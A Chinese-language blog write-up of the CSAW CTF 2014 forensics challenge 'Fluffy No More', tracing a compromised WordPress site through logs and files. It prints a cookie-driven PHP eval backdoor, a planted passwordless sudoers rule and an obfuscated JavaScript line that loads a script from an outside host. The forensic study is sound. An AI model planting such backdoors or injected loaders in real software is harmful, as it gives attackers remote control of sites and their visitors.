---
layout: post
title: "CSAW CTF 2014 Forensics 300 Fluffy No More Write-up"
date: 2014-09-24 21:15:06 +0800
comments: true
categories: [ctf, CSAW, Jeopardy, Forensics]
---
{% img /images/writeup/csaw2014_taskboard.png %}

最近實在太忙了,請容許我的 Defcon 下集繼續拖稿, 趁剛打完 CTF 記憶猶新先寫write-upXD

CSAW CTF 是給大學生打的CTF, 只允許純大學生的隊伍參加決賽,冠軍獎金不少,吸引了不少強者參加.
一年之中最適合初學者參加的CTF非他莫屬, 題目平易近人,就算只會google也可以拿到幾百分.

本次 Write-up 選擇 Foensics 300 , 除了題目設計的很像真實發生的資安事件外, 最重要的是我們在最後一步卡了四五個小時, 必須好好記錄下來避免再次犯錯. 


<!--  more -->

{% img /images/writeup/csaw2014_f300.png %}
[題目備份](https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more)

大意就是有個人的網站被駭了,許多該網站的使用者受到影響,站長已經將 伺服器的設定檔(/etc),網站(web root directory), 日誌 (/var/log) , 資料庫 (sql)
全部備分出來,請你協助調查發生了什麼事情.

做這種事件調查時, 幾個資訊要先釐清 發生的大概時間, 攻擊來源, 影響範圍等. 遺憾的是真的發生事件時這些重要資訊大概都沒有,跟題目一樣(汗) 

因此我從 http access log 看起 , 濾掉 404  , css , js 的 query . 再檢查一下 useragent 會發現有幾個大量使用 scanner 的 IP , 但都不是我們要找的目標.

此時atdog直接去翻網頁目錄, 看到是wordpress就直接往 plugin / upload 找,直接就找到後門.

{% img /images/writeup/csaw2014_f300_backdoor.png %}

事後我們猜測這邊應該是要先去看wordpress用的plugin,會看到 wysija  然後google wysija exploit會找到 [任意檔案上傳漏洞](http://www.exploit-db.com/exploits/33991/) , 從攻擊payload裡面可以抓出特徵,再去log裡面找到攻擊者IP及上傳的後門

{% img /images/writeup/csaw2014_f300_exploit.png %}

回歸正題, backdoor 被混淆過,簡單把最後一行的最外層變數改成echo就可以拿到最後執行的php command

```php
$c='count';
$a=$_COOKIE;
if(reset($a)=='ha' && $c($a)>3){
      $k='ckit';echo '<'.$k.'>';
      eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
      echo '</'.$k.'>';
}
```
由於駭客很賤的把命令藏在cookie裡, 所以無法從log還原出下的指令, 只能根據時間去檢查系統設定檔修改時間. 很幸運的我們有整個/etc, 有正確的時間點我們很快找出被駭客動過的檔案, 用IP去grep log也會看到很多嘗試登入系統的動作.
```
#cat etc/sudoers.d/casper
ubuntu  ALL=(ALL) NOPASSWD: ALL
```

看到這邊再回頭看auth.log就會發現那一系列的sudo command有部分應該是hacker下的, 其中一行vi html5.js特別可疑
```
#cat auth.log  | grep vi
Sep 17 17:17:51 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings get org.gnome.nautilus.desktop volumes-visible
Sep 17 17:17:59 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings set org.gnome.nautilus.desktop volumes-visible false
Sep 17 17:18:08 ubuntu gnome-keyring-daemon[4914]: couldn't set environment variable in session: Setenv interface is only available during the Initialization phase
Sep 17 17:22:19 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get install lamp-server^ vim
Sep 17 17:24:52 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/vi /etc/hosts
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```
去將原版twentythirteen的html5.js抓下來比對會發現多一行:

```
if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document); var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
```

直接丟進瀏覽器的開發者工具執行,會被導到一個 [PDF](http://128.238.66.100/announcement.pdf)  然後我們用pdfdump, hexedit, 010edit都看不出個所以然,回頭又繼續翻log. 找各種蛛絲馬跡.

浪費了幾個小時,還一度以為右下角的imgurl是線索,要去imgurl找出作圖的作者.最後發現是 pdfdump -raw的output不會decode,用pdfdump -b -i 8 就直接看到javascript跟key了...


CTF結束後看別人的 [Write-up](https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more) , [PDF streaming dump](http://sandsprite.com/blogs/index.php?uid=7&pid=57) 比 [dumppdf](http://www.unixuser.org/~euske/python/pdfminer/)更強大,要學起來.
